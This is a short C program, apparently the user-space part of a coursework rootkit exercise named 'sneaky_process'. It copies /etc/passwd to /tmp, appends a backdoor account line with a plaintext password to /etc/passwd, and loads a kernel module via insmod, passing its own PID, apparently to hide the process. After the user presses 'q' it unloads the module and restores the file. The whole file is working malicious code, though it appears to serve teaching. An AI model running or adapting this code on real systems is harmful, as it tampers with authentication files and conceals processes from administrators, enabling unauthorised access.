#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// 1: print the process ID of the current process
void print_pid() {
    printf("sneaky_process pid = %d\n", getpid());
}

// 2: perform 1 malicious action
// 2.1: copy the passwd file to /tmp/passwd
void copy_passwd() {
    system("cp /etc/passwd /tmp/passwd");
    // printf("passwd copied\n");
}
// 2.2: append a new line to the passwd file
void append_psswd() {
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
    // printf("passwd appended\n");
}

// 3: load the sneaky module
void load_sneaky_module() {
    char cmd[100];  // might be 100, or 40
    int mypid = getpid();
    sprintf(cmd, "insmod sneaky_mod.ko sneaky_pid=%d", mypid);
    system(cmd);
    // printf("sneaky_mod loaded\n");
}

// 4: wait for the user to press a key, see main()

// 5: unload the sneaky module
void unload_sneaky_module() {
    system("rmmod sneaky_mod");
    // printf("sneaky_mod unloaded\n");
}

// 6: restore the passwd file
void restore_passwd() {
    system("cp /tmp/passwd /etc/passwd");
    // system("rm /tmp/passwd");
    // printf("passwd restored\n");
}

int main() {
    print_pid();
    copy_passwd();
    append_psswd();
    load_sneaky_module();
    // 4: wait for the user to press q
    char c;
    while (1) {
        c = getchar();
        if (c == 'q') {
            break;
        }
    }
    unload_sneaky_module();
    restore_passwd();
    return 0;
}
